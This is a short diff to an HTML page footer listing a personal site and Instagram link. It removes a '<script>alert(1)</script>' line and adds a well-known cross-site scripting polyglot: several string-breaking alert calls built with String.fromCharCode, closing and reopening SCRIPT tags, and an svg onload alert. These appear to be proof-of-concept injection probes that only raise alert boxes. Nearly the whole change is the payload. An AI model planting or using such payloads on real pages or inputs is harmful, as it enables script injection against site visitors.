@@ -8,4 +8,4 @@
   <a href="http://th-release.kro.kr" rel="nofollow">site</a> •
   <a href="https://www.instagram.com/th_release.cth">instagram</a>
 </div>
-<script>alert(1)</script>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><svg/onload=alert('하이')//
